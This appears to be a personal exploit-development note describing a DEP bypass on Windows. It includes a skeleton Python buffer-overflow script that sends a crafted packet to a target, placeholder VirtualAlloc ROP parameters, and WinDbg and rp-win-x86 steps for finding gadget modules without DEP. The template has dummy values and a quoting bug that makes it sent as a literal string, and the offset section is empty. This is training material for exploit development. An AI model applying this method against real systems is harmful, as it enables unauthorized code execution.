# DEP Bypass

Uses Gadgets / Rop Chains to call the `VirtualAlloc` function and execute shellcode

### 1. Skeleton Starting Python Code
```
import socket
import sys
from struct import pack

# variables
SIZE = 500

# CommandBuffer
# These lines execute VirtualAlloc with shellcode
va  = pack("<L", (0x45454545)) # dummy VirtualAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect

# buffer
offset = b'\x41' * SIZE
eip = b'\x42' * 4
rop = b'\x43' * (0x600 - SIZE - len(eip))

buf = b'offset + va + eip + rop'
print('[I] %s : %s' % (len(buf),buf)) # always good to print buffers to make sure they meet expectation

def main():
  if len(sys.argv) != 3:
    print('Usage: %s <ip_address> <port>\n' % (sys.argv[0]))
    sys.exit(1)

  server = sys.argv[1]
  port = sys.argv[2]
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  
  s.send(buf)
  s.close()

  print('[+] Packet sent')
  sys.exit()

if __name__ == '__main__':
  main()
```

### 2. Identify Offset  
...  

### 3. Find Bad Characters 
[Finding Bad Characters](https://github.com/cyberheisen/Penetration-Testing-Notes/blob/main/exploit_dev/identifying_bad_characters.md)  

### 4. Identify File(s) to use for Gadgets
* Files must not have DEP enabled.
* Files must not have bad characters in high bits of memory address
```
# Using Windbg
# list modules
>lm
start    end        module name
00190000 001c3000   snclientapi   (deferred)             
001d0000 001fd000   libcclog   (deferred)             
00400000 00c0c000   GraceServer   (deferred)             
012c0000 01302000   NLS        (deferred)             
01380000 013ab000   gsk8iccs   (deferred)             
01440000 0147a000   icclib019   (deferred)             
030d0000 031c0000   libeay32IBM019   (deferred)

>!dh -f <memory base address>
 ...
  # This means DEP/NX is enabled
    4140  DLL characteristics
            Dynamic base
            NX compatible
            Guard
  ...
  # No DEP enabled
  0  DLL characteristics
```

### 5.  Extract Gadgets from file

Using `rp-win-x86.exe`
```
C:\rp-win-x86 -f <file> -r <max number of instructions> > <output file>
```
Load the output file into Visual Studio Code or text editor to search

